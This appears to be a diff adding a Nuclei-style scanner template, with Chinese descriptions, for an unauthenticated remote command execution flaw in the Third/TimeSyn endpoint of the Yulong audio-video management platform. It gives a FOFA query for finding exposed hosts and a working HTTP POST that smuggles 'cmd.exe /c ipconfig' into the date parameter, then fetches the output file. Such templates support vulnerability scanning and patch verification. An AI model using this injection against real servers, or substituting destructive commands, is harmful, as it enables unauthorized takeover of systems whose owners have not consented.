@@ -1,0 +1,45 @@
+id: yulong-Third_TimeSyn-RCE
+
+info:
+  name: "誉龙视音频综合管理平台 Third 接口远程命令执行漏洞"
+  author: Unknown
+  severity: high
+  description: |-
+    fofa: body="PView 视音频管理平台"
+    誉龙视音频综合管理平台 Third/TimeSyn 接口存在可被利用的远程代码执行缺陷，攻击者可利用该接口在目标服务器上执行任意系统命令，导致服务控制权被完全接管。该漏洞无需身份验证即可触发，利用条件门槛较低，建议立即部署补丁或实施访问控制策略以消除风险。
+  reference:
+  - https://mp.weixin.qq.com/s?__biz=MzkzMTcwMTg1Mg==&mid=2247487664&idx=1&sn=229b4b4ae0c9d9dd9d64dce3f32fcd52&chksm=c267a583f5102c953f3c59e619a0196eda9df9cce115f5209e3e7026b50d2954fa23b604b788&token=1439003696&lang=zh_CN#rd
+  tags: 誉龙视音频综合管理平台
+
+variables:
+  username: "{{to_lower(rand_base(6))}}" #从可选字符集（默认为字母和数字）生成给定长度字符串的随机序列
+
+http:
+- raw:
+  - |
+    POST /index.php?r=Third/TimeSyn HTTP/1.1
+    Host: {{Hostname}}
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:130.0) Gecko/20100101 Firefox/130.0
+    Content-Type: application/x-www-form-urlencoded
+
+    cloudKey=0x0&date=|cmd.exe+/c+ipconfig+>+{{username}}.txt&time=1
+
+  - |
+    GET /{{username}}.txt HTTP/1.1
+    Host: {{Hostname}}
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:130.0) Gecko/20100101 Firefox/130.0
+
+  matchers-condition: and
+  matchers:
+  - type: word
+    part: body
+    words:
+    - 'IP'
+    - 'Windows'
+    condition: and
+  - type: status
+    status:
+    - 200
+
+
+
